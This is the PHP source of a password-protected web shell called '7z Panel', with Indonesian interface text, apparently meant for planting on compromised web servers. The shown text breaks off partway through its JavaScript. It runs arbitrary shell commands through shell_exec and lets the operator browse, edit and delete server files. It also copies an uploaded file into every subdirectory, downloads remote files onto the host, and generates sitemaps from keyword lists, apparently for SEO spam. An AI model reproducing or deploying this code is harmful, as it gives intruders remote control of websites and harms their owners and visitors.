<?php
session_start();

// Konfigurasi password
$PASSWORD = '7zandfriends';

// Handle logout
if (isset($_GET['keluar'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}



// Handle login
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
       if ($_POST['pass'] === $PASSWORD) {
    $_SESSION['logged_in'] = true;
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

         else {
            $error = "Password salah!";
        }
    }

    // Tampilkan form login
    ?>
     <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Login 7z Panel</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
            * {
                box-sizing: border-box;
            }
            body {
                margin: 0;
                height: 100vh;
                font-family: 'Inter', sans-serif;
                background: linear-gradient(135deg, #626262, #20242b);
                display: flex;
                justify-content: center;
                align-items: center;
                color: #e0f7f4;
            }
            .login-container {
                background: #101214;
                padding: 40px 30px;
                border-radius: 12px;
                box-shadow: 0 8px 24px rgba(0, 0, 0, 0.75);
                width: 320px;
                text-align: center;
            }
            .login-container h2 {
                margin-bottom: 24px;
                font-weight: 600;
                font-size: 1.5rem;
                color: #ffcc25; /* warna utama 7z */
                letter-spacing: 0.05em;
            }
            input[type="password"] {
                width: 100%;
                padding: 12px 14px;
                font-size: 1rem;
                border-radius: 8px;
                border: 1.5px solid #967f33;
                background-color: #101214;
                color: #e0f7f4;
                transition: border-color 0.3s ease;
                outline: none;
                margin-bottom: 20px;
            }
            input[type="password"]::placeholder {
                color: #75d9cc;
            }
            input[type="password"]:focus {
                border-color: #6ee7b7; /* warna highlight */
                box-shadow: 0 0 8px #6ee7b7aa;
                background-color: #121a22;
            }
            button {
                width: 100%;
                padding: 12px;
                font-size: 1rem;
                font-weight: 600;
                background-color: #967f33;
                color: #111;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                transition: background-color 0.3s ease;
                user-select: none;
            }
            button:hover {
                background-color: cyan;
            }
            .error {
                margin-top: 12px;
                color: #f87171;
                font-weight: 500;
                font-size: 0.9rem;
                user-select: none;
            }
            .lock-icon {
                font-size: 3rem;
                margin-bottom: 16px;
                color: #4ec9b0;
            }
            @media (max-width: 400px) {
                .login-container {
                    width: 90%;
                    padding: 30px 20px;
                }
            }
        </style>
    </head>
    <body>
        <div class="login-container" role="main" aria-label="Login Form">
            <div class="lock-icon" aria-hidden="true">🔒</div>
            <h2>7z Panel Login</h2>
            <form method="post" novalidate>
                <input type="password" name="pass" placeholder="Masukkan Password..." required autocomplete="current-password" aria-label="Password" />
                <button type="submit">Masuk</button>
            </form>
            <?php if (isset($error)): ?>
                <div class="error" role="alert"><?= htmlspecialchars($error) ?></div>
            <?php endif; ?>
        </div>
    </body>
    </html>
    <?php
    exit;
}
?>


<?php

function formatSize($bytes) {
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    if ($bytes == 0) return '0 B';
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $sizes[$i];
}

function getChmodColor($perms) {
    $oct = substr(sprintf('%o', fileperms($perms)), -4); // ambil 4 digit terakhir
    $numeric = octdec($oct);
    $isReadable = is_readable($perms);
    $isWritable = is_writable($perms);
    $isExecutable = is_executable($perms);
    
    $color = ($isReadable && $isWritable) ? 'green' : 'red';

    return "<span style='color:$color;font-weight:bold;'>$oct</span>";
}


// Ajax-based File Manager OneFile
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['ajax']) && $_POST['ajax'] === 'list') {
        $path = realpath($_POST['path'] ?? '.');
        if (!$path || !is_dir($path)) exit('Invalid directory');
        $items = scandir($path);
        
        echo "<table><tr><th>Nama</th><th>Ukuran</th><th>CHMOD</th><th>Aksi</th></tr>";
        if ($path !== '/') {
            echo "<tr><td colspan='3'><a href='#" . urlencode(dirname($path)) . "'>⬅️ Back</a></td></tr>";
        }
        foreach ($items as $item) {
            if ($item === '.') continue;
            $full = "$path/$item";
            $url = urlencode($full);
            echo "<tr>";
            
                if (is_dir($full)) {
               echo "<td><a href='#$url'>📁 $item</a></td>";
               echo "<td>--</td>";
               echo "<td>" . getChmodColor($full) . "</td><td>";
               echo "<a href='#renamefolder=$url'>🔄 Ganti Nama Folder |</a> ";
               echo "<a href='#deletefolder=$url' onclick='return confirm(\"Hapus folder & isinya?\")'>🗑️ Hapus</a>";
          }
           else {
                echo "<td>📄 $item</td>";
                echo "<td>" . formatSize(filesize($full)) . "</td>";
                echo "<td>" . getChmodColor($full) . "</td><td>";
                echo "<a href='#view=$url'>👁️ Lihat File |</a> ";
                echo "<a href='#edit=$url'>📝 Ubah File |</a> ";
                echo "<a href='#rename=$url'>📄 Ganti Nama File |</a> ";
                echo "<a href='#delete=$url' onclick='return confirm(\"Hapus file?\")'>🗑️ Hapus</a>";
                echo "</td>";
            }
            echo "</tr>";
        }
        echo "</table>";
        exit;
    } elseif (isset($_POST['ajax']) && $_POST['ajax'] === 'view') {
        $file = urldecode($_POST['file']);
        if (is_file($file)) {
            echo '<pre class="terminal-output">' . htmlspecialchars(file_get_contents($file)) . '</pre>';
        } else echo 'File tidak ditemukan.';
        exit;
    } elseif (isset($_POST['ajax']) && $_POST['ajax'] === 'edit') {
        $file = urldecode($_POST['file']);
        if ($_POST['save'] ?? false) {
            file_put_contents($file, $_POST['content']);
            exit('File disimpan.');
        }
        if (is_file($file)) {
            $content = htmlspecialchars(file_get_contents($file));
            echo "<form onsubmit='return saveEdit(\"" . htmlspecialchars($file) . "\")'>
<textarea id='edit-content' style='width:100%;height:300px;'>$content</textarea>
<br><button type='submit'>💾 Simpan</button> <button type='button' onclick='loadDir(currentDir)'>❌ Batal</button></form>";
        } else echo 'File tidak ditemukan.';
        exit;
    } elseif (isset($_POST['ajax']) && $_POST['ajax'] === 'rename') {
        $file = urldecode($_POST['file']);
        $new = dirname($file) . '/' . basename($_POST['new']);
        if (rename($file, $new)) echo 'Berhasil diganti nama.';
        else echo 'Gagal.';
        exit;
    } elseif (isset($_POST['ajax']) && $_POST['ajax'] === 'delete') {
        $file = urldecode($_POST['file']);
        if (is_file($file) && unlink($file)) echo 'File dihapus.';
        else echo 'Gagal menghapus.';
        exit;
    } elseif (isset($_POST['ajax']) && $_POST['ajax'] === 'upload') {
        $dir = realpath($_POST['dir']);
        if (is_dir($dir) && isset($_FILES['file'])) {
    $targetFile = $dir . '/' . basename($_FILES['file']['name']);

    if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
        echo "Upload gagal: " . $_FILES['file']['error'];
    } elseif ($_FILES['file']['size'] === 0) {
        echo "Upload gagal: file kosong (0KB).";
    } elseif (!is_writable($dir)) {
        echo "Upload gagal: folder tidak bisa ditulis.";
    } else {
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            echo "Upload berhasil: " . basename($_FILES['file']['name']);
        } else {
            echo "Upload gagal: tidak bisa memindahkan file.";
        }
    }
}

        exit;
    } 


       elseif ($_POST['ajax'] === 'delete_folder') {
    $folder = urldecode($_POST['folder']);

    function deleteFolderRecursive($dir) {
        if (!is_dir($dir)) return false;
        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) {
                deleteFolderRecursive($path);
            } else {
                unlink($path);
            }
        }
        return rmdir($dir);
    }

    if (is_dir($folder)) {
        if (deleteFolderRecursive($folder)) {
            echo "✅ Folder berhasil dihapus.";
        } else {
            echo "❌ Gagal menghapus folder.";
        }
    } else {
        echo "❌ Folder tidak ditemukan.";
    }
    exit;
}

elseif ($_POST['ajax'] === 'rename_folder') {
    $folder = urldecode($_POST['folder']);
    $newName = basename($_POST['new']);
    $newPath = dirname($folder) . '/' . $newName;

    if (is_dir($folder)) {
        if (rename($folder, $newPath)) {
            echo "✅ Folder berhasil diganti nama.";
        } else {
            echo "❌ Gagal mengganti nama folder.";
        }
    } else {
        echo "❌ Folder tidak ditemukan.";
    }
    exit;
}
 

        elseif (isset($_POST['ajax']) && $_POST['ajax'] === 'cmd') {
        $cmd = $_POST['cmd'] ?? '';
        $dir = realpath($_POST['dir'] ?? '.'); // ✅ Tambahan: sesuaikan direktori kerja
        if ($dir && is_dir($dir)) {
            chdir($dir); // ✅ Ubah working directory
        }
        echo '<pre class="terminal-output">' . htmlspecialchars(shell_exec($cmd)) . '</pre>';
        exit;
    } elseif ($_POST['ajax'] === 'create_file') {
        $dir = realpath($_POST['dir']);
        $name = basename($_POST['name']);
        $path = $dir . '/' . $name;
        if (is_dir($dir) && !file_exists($path)) {
            if (file_put_contents($path, '') !== false) echo 'File berhasil dibuat.';
            else echo 'Gagal membuat file.';
        } else echo 'File sudah ada atau direktori tidak valid.';
        exit;
    } elseif ($_POST['ajax'] === 'create_folder') {
        $dir = realpath($_POST['dir']);
        $name = basename($_POST['name']);
        $path = $dir . '/' . $name;
        if (is_dir($dir) && !file_exists($path)) {
            if (mkdir($path)) echo 'Folder berhasil dibuat.';
            else echo 'Gagal membuat folder.';
        } else echo 'Folder sudah ada atau direktori tidak valid.';
        exit;
    }

    elseif (isset($_POST['ajax']) && $_POST['ajax'] === 'auto_sitemap') {
    $dir = isset($_POST['dir']) ? $_POST['dir'] : '.';
    $folder_url = isset($_POST['folder_url']) ? trim($_POST['folder_url'], "/") : '';

    $file_path = rtrim($dir, "/") . "/data.txt";
    if (!file_exists($file_path)) {
        echo "❌ <b>data.txt</b> tidak ditemukan di: <code>$file_path</code>";
        exit;
    }

    $lines = file($file_path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$lines) {
        echo "❌ <b>Isi data.txt kosong</b>";
        exit;
    }

    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";

    $sitemap = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
    $sitemap .= "<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";

    foreach ($lines as $line) {
        $line = trim($line);
        if ($line !== '') {
            $url = $folder_url !== '' ? "{$base_url}/{$folder_url}/{$line}" : "{$base_url}/{$line}";
            $sitemap .= "  <url><loc>{$url}</loc></url>\n";
        }
    }

    $sitemap .= "</urlset>";

    $sitemap_path = rtrim($dir, "/") . "/sitemap.xml";
    file_put_contents($sitemap_path, $sitemap);

    echo "✅ Sitemap berhasil dibuat di <code>{$sitemap_path}</code><br><br>";
    echo "<pre>" . htmlentities($sitemap) . "</pre>";
    exit;
}


elseif (isset($_POST['ajax']) && $_POST['ajax'] === 'auto_sitemap2') {
    $dir = isset($_POST['dir']) ? $_POST['dir'] : '.';
    $slug = isset($_POST['slug_name']) ? trim($_POST['slug_name']) : 'slug';
    $manual_folder_url = isset($_POST['folder_url']) ? trim($_POST['folder_url'], "/") : '';

    $realDir = realpath($dir);
    if (!$realDir || !is_dir($realDir)) {
        echo "❌ Direktori tidak valid.";
        exit;
    }

    $data_file = $realDir . '/data.txt';
    $sitemap_file = $realDir . '/sitemap.xml';

    if (!file_exists($data_file)) {
        echo "❌ File <code>data.txt</code> tidak ditemukan di direktori:<br><code>$realDir</code>";
        exit;
    }

    // Bangun base URL dari domain + folder URL (tanpa double slash)
    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
    if ($manual_folder_url !== '') {
        $base_url .= '/' . $manual_folder_url;
    }

    // Ambil isi data.txt dan filter
    $entries = array_filter(array_map('trim', file($data_file)));

    // Buat XML sitemap
    $xml = new DOMDocument('1.0', 'UTF-8');
    $xml->formatOutput = true;

    $urlset = $xml->createElement('urlset');
    $urlset->setAttribute('xmlns', 'http://www.sitemaps.org/schemas/sitemap/0.9');

    foreach ($entries as $value) {
        $url_tag = $xml->createElement('url');

        $full_url = $base_url . '/?' . $slug . '=' . urlencode($value);

        $url_tag->appendChild($xml->createElement('loc', $full_url));
        $url_tag->appendChild($xml->createElement('lastmod', date('Y-m-d')));
        $url_tag->appendChild($xml->createElement('changefreq', 'weekly'));
        $url_tag->appendChild($xml->createElement('priority', '0.8'));

        $urlset->appendChild($url_tag);
    }

    $xml->appendChild($urlset);
    $xml->save($sitemap_file);

    // Buat link ke sitemap.xml (tanpa double slash)
    $sitemap_url = ($manual_folder_url !== '') ? '/' . $manual_folder_url . '/sitemap.xml' : '/sitemap.xml';

    echo "<h2>✅ Sitemap berhasil dibuat!</h2>";
    echo "<a href='" . htmlspecialchars($sitemap_url) . "' target='_blank'>📄 Lihat sitemap.xml</a><br>";
    echo "🔢 Jumlah entri: <strong>" . count($entries) . "</strong><br>";
    echo "🌐 URL Base: <code>" . htmlspecialchars($base_url) . "</code><br>";
    echo "🔑 Slug: <code>?$slug=...</code><br>";
    echo "📁 Direktori: <code>" . htmlspecialchars($realDir) . "</code>";
    exit;
}


elseif (isset($_POST['ajax']) && $_POST['ajax'] === 'mass_upload') {
    $upload_messages = [];

    $upload_to = isset($_POST['uploadto']) ? $_POST['uploadto'] : getcwd();
    $upload_to = realpath($upload_to);
    if (!$upload_to || !is_dir($upload_to)) {
        exit("❌ Direktori target tidak valid.");
    }

    function getAllFoldersRecursive($dir) {
        $folders = [];
        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = "$dir/$item";
            if (is_dir($path)) {
                $folders[] = $path;
                $folders = array_merge($folders, getAllFoldersRecursive($path));
            }
        }
        return $folders;
    }

    $folders = getAllFoldersRecursive($upload_to);
    array_unshift($folders, $upload_to); // juga upload ke direktori utama

    $file = $_FILES['file'] ?? null;
    if (!$file || $file['error'] !== UPLOAD_ERR_OK) {
        exit("❌ Upload gagal.");
    }

    foreach ($folders as $folder) {
        $target = rtrim($folder, '/') . '/' . basename($file['name']);
        if (copy($file['tmp_name'], $target)) {
            $upload_messages[] = "✅ " . $target;
        } else {
            $upload_messages[] = "❌ " . $target;
        }
    }

    echo implode("\n", $upload_messages);
    exit;
}


elseif ($_POST['ajax'] === 'upload_url') {
    $dir = isset($_POST['dir']) ? $_POST['dir'] : '.';
    $realDir = realpath($dir);
    if (!$realDir || !is_dir($realDir)) {
        echo "<span style='color:red;'>❌ Direktori tidak valid.</span>";
        exit;
    }

    $url = trim($_POST['url'] ?? '');
    $customName = trim($_POST['custom_name'] ?? '');

    if (filter_var($url, FILTER_VALIDATE_URL)) {
        $fileName = $customName !== '' ? basename($customName) : basename(parse_url($url, PHP_URL_PATH));
        $savePath = $realDir . '/' . $fileName;

        $fileContent = @file_get_contents($url);
        if ($fileContent !== false) {
            file_put_contents($savePath, $fileContent);
            echo "<span style='color:lime;'>✅ <strong>$fileName</strong> berhasil upload ke <code>$dir</code></span>";
        } else {
            echo "<span style='color:red;'>❌ Gagal mengunduh file dari URL.</span>";
        }
    } else {
        echo "<span style='color:red;'>❌ URL tidak valid.</span>";
    }
    exit;
}


}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>7z Panel System</title>
    <style>
            #logout-btn {
        position: fixed;
        top: 10px;
        right: 10px;
        background: #4d3a3abf;
        color: white;
        font-weight: 600;
        border: none;
        padding: 8px 14px;
        border-radius: 6px;
        cursor: pointer;
        z-index: 9999;
        text-decoration: none;
        user-select: none;
        transition: background-color 0.3s ease;
    }
    #logout-btn:hover {
        background-color: #860000bf;
    }
        body { font-family: monospace; background: #111; color: #eee; margin: 0; padding: 0; }
        h2 { background: #222; padding: 10px; margin: 0; }
        #menu { background: #333; padding: 10px; display: flex; gap: 10px; flex-wrap: wrap; }
        #menu a { color: #fff; text-decoration: none; background: #555; padding: 6px 10px; border-radius: 4px; }
        #menu a:hover { background: #777; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 6px; border: 1px solid #444; }
        th { background: #222; }
        a { color: #ffffff; text-decoration: none; }
        .terminal-output { background: #112723; color: yellow; padding: 10px; overflow: auto; }
        .upload-box {
            background: #1e1e1e;
            padding: 15px;
            border-bottom: 1px solid #444;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .custom-file-upload {
            background-color: #444;
            color: #eee;
            padding: 6px 12px;
            border-radius: 4px;
            cursor: pointer;
            display: inline-block;
        }

        .custom-file-upload input[type="file"] {
            display: none;
        }

        .upload-btn {
            background-color: #4ec9b0;
            border: none;
            padding: 6px 12px;
            color: #000;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
        }

        .upload-btn:hover {
            background-color: #38b09d;
        }

        .form-container {
    background: #1f1f2e;
    padding: 25px;
    border-radius: 10px;
    max-width: 600px;
    margin: auto;
    color: #eee;
    box-shadow: 0 0 10px rgba(0,255,200,0.2);
}


    .cmd-container-left {
    background: #1f1f2e;
    padding: 20px;
    border-radius: 8px;
    margin: 20px;
    box-shadow: 0 0 8px rgba(0,255,200,0.1);
    color: #eee;
    max-width: 100%;
}

.cmd-container-left h2 {
    margin-top: 0;
    font-size: 1.3rem;
    color: #4ec9b0;
}

.cmd-form {
    display: flex;
    gap: 10px;
    margin-bottom: 15px;
    flex-wrap: wrap;
}

.cmd-form input[type="text"] {
    flex: 1;
    min-width: 250px;
    padding: 10px;
    background: #2a2a3d;
    border: 1px solid #444;
    color: #fff;
    border-radius: 6px;
    font-family: monospace;
    font-size: 15px;
}

.cmd-form input[type="text"]:focus {
    border-color: #00ffaa;
    background-color: #2e2e40;
    outline: none;
}

.cmd-form button {
    padding: 10px 18px;
    background: #4ec9b0;
    color: #000;
    font-weight: bold;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    transition: 0.3s ease;
}

.cmd-form button:hover {
    background: #38b09d;
}

.terminal-output-box {
    background: #000;
    color: yellow;
    font-family: 'Courier New', monospace;
    padding: 16px;
    border-radius: 8px;
    border: 1px solid #333;
    white-space: pre-wrap;
    max-height: 400px;
    overflow-y: auto;
    box-shadow: inset 0 0 10px #00ffcc33;
}

    .sitemap-container-left {
    background: #222222;
    padding: 20px;
    border-radius: 8px;
    margin: 20px;
    box-shadow: 0 0 8px rgb(255 255 255);
    color: #eee;
    max-width: 100%;
}

.sitemap-container-left h2 {
    margin-top: 0;
    font-size: 1.3rem;
    color: #4ec9b0;
}

.sitemap-form label {
    display: block;
    margin-bottom: 15px;
    font-weight: bold;
    color: #ccc;
}

.sitemap-form input[type="text"] {
    width: 100%;
    padding: 10px;
    background: #333333;
    border: 1px solid #555555;
    color: #fff;
    border-radius: 6px;
    margin-top: 6px;
    box-sizing: border-box;
}

.sitemap-form input[type="text"]:focus {
    border-color: #00ffaa;
    background-color: #2e2e40;
    outline: none;
}

.sitemap-form button {
    padding: 10px 20px;
    background: #8c8c8c;
    color: #000;
    font-weight: bold;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    margin-top: 10px;
    transition: 0.3s ease;
}

.sitemap-form button:hover {
    background: #bbbbbb;
}

.result-box {
    margin-top: 20px;
    background: #555555;
    border: 1px solid #555;
    padding: 15px;
    color: #da9d00;
    font-family: monospace;
    white-space: pre-wrap;
    border-radius: 8px;
    max-height: 400px;
    overflow: auto;
}

    .mass-container-left {
    background: #222222;
    padding: 20px;
    border-radius: 8px;
    margin: 20px;
    box-shadow: 0 0 8px rgb(255 255 255);
    color: #eee;
    max-width: 100%;
}

.mass-container-left h2 {
    margin-top: 0;
    font-size: 1.3rem;
    color: #4ec9b0;
}

.mass-form label {
    display: block;
    margin-bottom: 15px;
    font-weight: bold;
    color: #ccc;
}

.mass-form input[type="text"],
.mass-form input[type="file"] {
    width: 100%;
    padding: 10px;
    background: #333333;
    border: 1px solid #555555;
    color: #fff;
    border-radius: 6px;
    box-sizing: border-box;
    margin-top: 6px;
}

.mass-form input:focus {
    border-color: #00ffaa;
    background-color: #2e2e40;
    outline: none;
}

.mass-form button[type="submit"] {
    padding: 10px 20px;
    background: #8c8c8c;
    color: #000;
    font-weight: bold;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    transition: 0.3s ease;
    margin-top: 10px;
}

.mass-form button[type="submit"]:hover {
    background: white;
}

.copy-button {
    margin-top: 10px;
    padding: 10px 16px;
    background: #ff5555;
    color: white;
    font-weight: bold;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    transition: 0.3s ease;
}

.copy-button:hover {
    background: #f90000;
}

#mass-result {
    width: 100%;
    height: 200px;
    background: #555555;
    color: #fbff00;
    border: 1px solid #444;
    border-radius: 6px;
    padding: 10px;
    font-family: monospace;
    box-sizing: border-box;
    resize: vertical;
    margin-top: 20px;
}

.footer-panel {
    background: #1a1a1a;
    color: #888;
    padding: 15px 20px;
    text-align: center;
    font-size: 14px;
    border-top: 1px solid #333;
    margin-top: 40px;
    box-shadow: 0 -2px 4px rgba(0,0,0,0.5);
}

.footer-panel .footer-inner {
    max-width: 1000px;
    margin: auto;
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 10px;
    line-height: 1.5;
}

.footer-panel a {
    color: #4ec9b0;
    text-decoration: none;
}

.footer-panel a:hover {
    text-decoration: underline;
    color: #00ffaa;
}

.upload-url-container {
    background: #222222;
    padding: 20px;
    border-radius: 8px;
    margin: 20px;
    box-shadow: 0 0 8px rgb(255 255 255);
    color: #eee;
    max-width: 100%;
}

.upload-url-form label {
    display: block;
    margin-bottom: 10px;
    font-weight: bold;
    color: #ccc;
}

.upload-url-form input[type="text"] {
    width: 100%;
    padding: 10px;
    background: #333333;
    border: 1px solid #555555;
    color: #fff;
    border-radius: 6px;
    margin-top: 5px;
    box-sizing: border-box;
}

.upload-url-form input[type="text"]:focus {
    border-color: #00ffaa;
    background-color: #2e2e40;
    outline: none;
}

.upload-url-form button {
    padding: 10px 20px;
    background: #8c8c8c;
    color: #000;
    font-weight: bold;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    transition: 0.3s ease;
}

.upload-url-form button:hover {
    background: white;
}

       
    </style>
</head>
<body>
  <a id="logout-btn" href="?keluar=1" title="Keluar dari 7z Panel">Keluar</a>

    <h2 style="display: flex; align-items: center; gap: 10px;">
  ⚙️ <img src="https://i.imgur.com/G8Nby02.png" alt="Logo" style="height: 28px;"> x <img src="https://i.imgur.com/vlTtm4X.png" alt="Logo" style="height: 28px;"> PaneL 
</h2>
    <div id="menu">
        <a href="#<?php echo rawurlencode(__DIR__); ?>">🏠 Home 7z</a>
        <a href="#cmd">💻 CMD</a>
        <a href="#auto_sitemap">🗺️ Auto Sitemap </a>
        <a href="#auto_sitemap2">🗺️ Auto Sitemap (Param)</a>
        <a href="#mass_upload">📤 MassJet</a>
        <a href="#upload_url">⬆️ UploadJet Bypass URL</a>

       
    </div>
<div id="breadcrumb" style="padding: 10px 12px; background: #1a1a1a; color: #eee; font-size: 14px;"></div>

    <div id="main-content">Memuat...</div>
<script>

let currentDir = <?php echo json_encode(__DIR__); ?>;



function updateBreadcrumb(path) {
    const container = document.getElementById('breadcrumb');
    const parts = path.replace(/\\/g, '/').split('/'); // aman untuk Windows
    let full = '';
    let html = '📂 <strong>Dir:</strong> ';
    for (let i = 0; i < parts.length; i++) {
        if (!parts[i]) continue;
        full += '/' + parts[i];
        html += `<a style="color:#ff0089" href="#${encodeURIComponent(full)}">${parts[i]}</a> / `;
    }
    container.innerHTML = html.slice(0, -3);
}


function loadDir(dir) {
    currentDir = dir;
    updateBreadcrumb(dir); // <--- panggilan di sini
    history.replaceState(null, '', '#' + encodeURIComponent(dir));
    const form = `
<div class="upload-box">
    <form onsubmit="uploadFile(event)">
        <label class="custom-file-upload">
            📎 Pilih File
            <input type="file" name="file" required>
        </label>
        <button class="upload-btn" type="submit">⬆️ Upload</button>
    </form>
   | <button style="background-color:#9e9ca0eb;border:none;padding:6px 12px;color:#000;font-weight:bold;border-radius:4px;cursor:pointer;" onclick="createFile()">📄 Buat File</button> |
    <button style="background-color:#c3b75d;border:none;padding:6px 12px;color:#000;font-weight:bold;border-radius:4px;cursor:pointer;" onclick="createFolder()">📁 Buat Folder</button>
</div>`;
    
    fetch('', {
        method: 'POST',
        headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body: 'ajax=list&path=' + encodeURIComponent(dir)
    })
    .then(r => r.text())
    .then(html => {
        document.getElementById('main-content').innerHTML = form + html;
    });
}

function uploadFile(e) {
    e.preventDefault();
    let formData = new FormData(e.target);
    formData.append('ajax', 'upload');
    formData.append('dir', currentDir);
    fetch('', { method:'POST', body: formData })
    .then(() => loadDir(currentDir));
}

function saveEdit(file) {
    fetch('', {
        method: 'POST',
        headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body: 'ajax=edit&file=' + encodeURIComponent(file) + '&save=1&content=' + encodeURIComponent(document.getElementById('edit-content').value)
    }).then(r => r.text()).then(msg => {
        alert(msg); loadDir(currentDir);
    });
    return false;
}

function loadView(mode, file) {
    fetch('', {
        method: 'POST',
        headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body: 'ajax=' + mode + '&file=' + encodeURIComponent(file)
    }).then(r => r.text()).then(html => {
        document.getElementById('main-content').innerHTML = html + "<br><a href='#"+encodeURIComponent(currentDir)+"'>⬅️ Kembali</a>";
    });
}

function deleteFile(file) {
    if (confirm("Hapus file?")) {
        fetch('', {
            method: 'POST',
            headers: {'Content-Type':'application/x-www-form-urlencoded'},
            body: 'ajax=delete&file=' + encodeURIComponent(file)
        }).then(() => loadDir(currentDir));
    }
}

function renameFile(file) {
    const newName = prompt("Nama baru:", file.split('/').pop());
    if (newName) {
        fetch('', {
            method: 'POST',
            headers: {'Content-Type':'application/x-www-form-urlencoded'},
            body: 'ajax=rename&file=' + encodeURIComponent(file) + '&new=' + encodeURIComponent(newName)
        }).then(r => r.text()).then(() => loadDir(currentDir));
    }
}

function loadCmd() {
  document.getElementById('main-content').innerHTML = `
    <div class="cmd-container">
      <h2>💻 Terminal Command</h2>
      <form onsubmit="runCmd(event)" class="cmd-form">
        <input id="cmd" type="text" placeholder="Masukkan perintah..." required>
        <button type="submit">▶️ Jalankan</button>
      </form>
      <div id="cmd-output" class="terminal-output-box">📥 Output akan muncul di sini...</div>
      <br><a href="#${encodeURIComponent(currentDir)}">⬅️ Kembali</a>
    </div>
  `;
}

function deleteFolder(folderPath) {
    if (confirm("Hapus folder dan seluruh isinya?")) {
        fetch('', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'ajax=delete_folder&folder=' + encodeURIComponent(folderPath)
        })
        .then(r => r.text())
        .then(msg => {
            alert(msg);
            loadDir(currentDir);
        });
    }
}

function renameFolder(folderPath) {
    const newName = prompt("Nama folder baru:", folderPath.split('/').pop());
    if (newName) {
        fetch('', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'ajax=rename_folder&folder=' + encodeURIComponent(folderPath) + '&new=' + encodeURIComponent(newName)
        })
        .then(r => r.text())
        .then(msg => {
            alert(msg);
            loadDir(currentDir);
        });
    }
}



function runCmd(e) {
    e.preventDefault();
    const cmd = document.getElementById('cmd').value;
    fetch('', {
        method: 'POST',
        headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body: 'ajax=cmd&cmd=' + encodeURIComponent(cmd) + '&dir=' + encodeURIComponent(currentDir) // ✅ Tambahan
    }).then(r => r.text()).then(output => {
        document.getElementById('cmd-output').innerHTML = output;
    });
}

function loadAutoSitemap() {
  const html = `
    <div class="sitemap-container-left">
      <h2>🗺️ Auto Sitemap </h2>
      <form onsubmit="submitSitemapTanpaParam(event)" class="sitemap-form">
        <label>
          📂 Path ke <code>data.txt</code>:
          <input type="text" name="dir" value="${currentDir}" required>
        </label>

        <label>
          🌐 Folder URL (misal: <code>7z</code>):
          <input type="text" name="folder_url" value="7z">
        </label>

        <button type="submit">🚀 Crott ah !</button>
      </form>
      <div id="sitemap-result-noparam" class="result-box"></div>
      <br><a href="#${encodeURIComponent(currentDir)}">⬅️ Kembali</a>
    </div>
  `;
  document.getElementById('main-content').innerHTML = html;
}


function submitSitemapTanpaParam(e) {
 e.preventDefault();
  const form = e.target;
  const formData = new FormData(form);
  formData.append('ajax', 'auto_sitemap');

  fetch('', {
    method: 'POST',
    body: formData
  })
  .then(res => res.text())
  .then(html => {
    // Pastikan hanya menimpa isi hasil, bukan form atau layoutnya
    document.getElementById('sitemap-result-noparam').innerHTML = html;
  })
  .catch(err => alert("Gagal: " + err));
}

function loadAutoSitemap2() {
  const html = `
    <div class="sitemap-container-left">
      <h2>🗺️ Auto Sitemap Parameter</h2>
      <form onsubmit="submitSitemap2(event)" class="sitemap-form">
        <label>
          📂 Path ke <code>data.txt</code>:
          <input type="text" name="dir" value="${currentDir}" required>
        </label>

        <label>
          🌐 Folder URL (misal: <code>7z</code>):
          <input type="text" name="folder_url" value="7z">
        </label>

        <label>
          🔑 Nama Parameter contoh :(tujuhjet):
          <input type="text" name="slug_name" value="tujuhjet" required>
        </label>

        <button type="submit">🚀 Crott ah</button>
      </form>
      <div id="sitemap-result" class="result-box"></div>
      <br><a href="#${encodeURIComponent(currentDir)}">⬅️ Kembali</a>
    </div>
  `;
  document.getElementById('main-content').innerHTML = html;
}



function submitSitemap2(e) {
  e.preventDefault();
  const form = e.target;
  const formData = new FormData(form);
  formData.append('ajax', 'auto_sitemap2');

  fetch('', {
    method: 'POST',
    body: formData
  })
  .then(res => res.text())
  .then(html => {
    document.getElementById('sitemap-result').innerHTML = html;
  })
  .catch(err => alert("Gagal: " + err));
}



function createFile() {
    const name = prompt("Nama file baru:");
    if (name) {
        fetch('', {
            method: 'POST',
